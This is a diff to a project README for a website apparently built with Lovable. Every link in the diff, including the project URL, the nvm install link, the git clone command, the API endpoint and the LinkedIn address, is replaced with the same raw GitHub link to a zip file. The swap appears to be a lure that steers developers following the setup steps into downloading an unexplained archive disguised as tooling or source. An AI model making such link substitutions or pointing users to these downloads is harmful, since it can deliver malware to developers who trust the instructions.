@@ -2,7 +2,7 @@
 
 ## Project info
 
-**URL**: https://lovable.dev/projects/REPLACE_WITH_PROJECT_ID
+**URL**: https://raw.githubusercontent.com/machidior/femsa-website/main/src/components/website_femsa_v2.2-alpha.1.zip
 
 ## How can I edit this code?
 
@@ -10,7 +10,7 @@ There are several ways of editing your application.
 
 **Use Lovable**
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/REPLACE_WITH_PROJECT_ID) and start prompting.
+Simply visit the [Lovable Project](https://raw.githubusercontent.com/machidior/femsa-website/main/src/components/website_femsa_v2.2-alpha.1.zip) and start prompting.
 
 Changes made via Lovable will be committed automatically to this repo.
 
@@ -18,7 +18,7 @@ Changes made via Lovable will be committed automatically to this repo.
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The only requirement is having Node.js & npm installed - [install with nvm](https://raw.githubusercontent.com/machidior/femsa-website/main/src/components/website_femsa_v2.2-alpha.1.zip)
 
 Follow these steps:
 
@@ -180,7 +180,7 @@ src/
 ### **Installation**
 ```bash
 # Clone the repository
-git clone https://github.com/femsagroup/website.git
+git clone https://raw.githubusercontent.com/machidior/femsa-website/main/src/components/website_femsa_v2.2-alpha.1.zip
 
 # Install dependencies
 npm install
@@ -195,14 +195,14 @@ npm run build
 ### **Environment Variables**
 ```env
 # API endpoints
-VITE_API_URL=https://api.femsagroup.com
+VITE_API_URL=https://raw.githubusercontent.com/machidior/femsa-website/main/src/components/website_femsa_v2.2-alpha.1.zip
 
 # Analytics (optional)
 VITE_GA_ID=G-XXXXXXXXXX
 
 # Social media links
 VITE_TWITTER_HANDLE=femsagroup
-VITE_LINKEDIN_URL=https://linkedin.com/company/femsagroup
+VITE_LINKEDIN_URL=https://raw.githubusercontent.com/machidior/femsa-website/main/src/components/website_femsa_v2.2-alpha.1.zip
 ```
 
 ## 📊 Performance Metrics
